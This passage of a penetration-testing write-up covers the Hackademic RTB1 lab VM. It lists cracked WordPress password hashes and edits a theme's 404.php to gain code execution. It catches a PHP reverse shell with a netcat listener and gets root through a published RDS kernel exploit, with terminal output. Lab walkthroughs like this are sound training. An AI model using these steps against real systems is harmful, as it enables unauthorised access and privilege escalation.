-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user_pass                user_login
-</span><span class='line'>21232f297a57a5a743894a0e4a801fc3  NickJames
-</span><span class='line'>b986448f0bb9e5e124ca91d3d650f52c  JohnSmith
-</span><span class='line'>7cbb3252ba6b7e9c422fac5334d22054  GeorgeMiller
-</span><span class='line'>a6e514f9486b83cb53d8d932f9a04292  TonyBlack
-</span><span class='line'>8601f6e1028a8e8a966f6c33fcd9aec4  JasonKonnors
-</span><span class='line'>50484c19f1afdaf3841a0d821ed393d2  MaxBucky</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Cracking the hashes revealed the passwords of all the users:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>admin
-</span><span class='line'>PUPPIES
-</span><span class='line'>q1w2e3
-</span><span class='line'>napoleon
-</span><span class='line'>maxwell
-</span><span class='line'>kernel</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Then I went to the Wordpress login page at <a href="http://192.168.80.162/Hackademic_RTB1/wp-login.php">http://192.168.80.162/Hackademic_RTB1/wp-login.php</a> and logged in as NickJames (assumed he was admin because of his password). But there was nothing extraordinary to be done with his privileges, just adding and editing posts. We have more users to try  though! When I reached GeorgeMiller, I noticed there were more actions available in the admin panel:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-panel.png" title="dashboard" alt="admin panel"></p>
-
-<p>In the Presentation tab I could edit themes for the site. I picked the 404.php file and replaced its content with a line that would echo something first, so I don&rsquo;t waste my time with shells without checking if code is executed successfully.</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-404.png" title="404.php" alt="php file edited"></p>
-
-<p>When I went to the <a href="http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php">http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php</a> URL, I saw RCE displayed, so next I used the now-familiar reverse PHP shell from pentestmonkey. Set up my listener and visited the URL again to receive the shell:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 5555
-</span><span class='line'>listening on [any] 5555 ...
-</span><span class='line'>connect to [192.168.80.161] from (UNKNOWN) [192.168.80.162] 50723
-</span><span class='line'>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
-</span><span class='line'> 13:23:45 up  3:04,  0 users,  load average: 0.00, 0.00, 0.00
-</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-</span><span class='line'>uid=48(apache) gid=489(apache) groups=489(apache)
-</span><span class='line'>sh: no job control in this shell</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Privilege escalation</h2>
-
-<p>The shell kept echoing back the commands I was running but otherwise it worked fine. I didn&rsquo;t find anything interesting that I could use during local enumeration, so I then searched for privilege escalation exploits that might apply to the kernel version 2.6.31 found on the box. The exploit that worked was the <a href="https://www.exploit-db.com/exploits/15285/">RDS privilege escalation exploit</a> by Dan Rosenberg. You can also find it on Kali with Searchsploit. I compiled it on my machine with the <em>-m32</em> flag for the target architecture and transfered it via netcat. Then I ran it and I stared a bit at the blinking cursor before confirming that it gave me root:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.0$ ./rds
-</span><span class='line'>./rds
-</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
-</span><span class='line'>[*] by Dan Rosenberg
-</span><span class='line'>[*] Resolving kernel addresses...
-</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
-</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
-</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
-</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
-</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
-</span><span class='line'>[*] Overwriting security ops...
-</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
-</span><span class='line'>[*] by Dan Rosenberg
-</span><span class='line'>[*] Resolving kernel addresses...
-</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
-</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
-</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
-</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
-</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
-</span><span class='line'>[*] Overwriting security ops...
-</span><span class='line'>[*] Overwriting function pointer...
-</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
-</span><span class='line'>[*] by Dan Rosenberg
-</span><span class='line'>[*] Resolving kernel addresses...
-</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
-</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
-</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
-</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
-</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
-</span><span class='line'>[*] Overwriting security ops...
-</span><span class='line'>[*] Overwriting function pointer...
-</span><span class='line'>[*] Triggering payload...
-</span><span class='line'>[*] Restoring function pointer...
-</span><span class='line'>id
-</span><span class='line'>uid=0(root) gid=0(root)
-</span><span class='line'>cat /root/key.txt
-</span><span class='line'>Yeah!!
-</span><span class='line'>You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)
-</span><span class='line'>
-</span><span class='line'>$_d&jgQ&gt;&gt;ak\#b"(Hx"o&lt;la_%
-</span><span class='line'>
-</span><span class='line'>Regards,
-</span><span class='line'>mr.pr0n || p0wnbox.Team || 2011
-</span><span class='line'>http://p0wnbox.com</span></code></pre></td></tr></table></div></figure>
-
-
-<h1>Debriefing</h1>
-
-<p>The machine looked pretty tightly locked with only a web server running. But the WordPress version was contained a known SQLi exploit that handed down the hashes for the users. One user had the rights to upload code on the server and facilitated geting (limited) access on the target. The kernel was vulnerable to a local root exploit, and from there it was game over.</p>
-
-<p>GG, nice VM! Now let&rsquo;s end with some wisdom straight from the cow&rsquo;s mouth:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>/ Don't relax! It's only your tension \
-</span><span class='line'>\ that's holding you together.        /
-</span><span class='line'> -------------------------------------
 </span><span class='line'>        \   ^__^
 </span><span class='line'>         \  (oo)\_______
 </span><span class='line'>            (__)\       )\/\
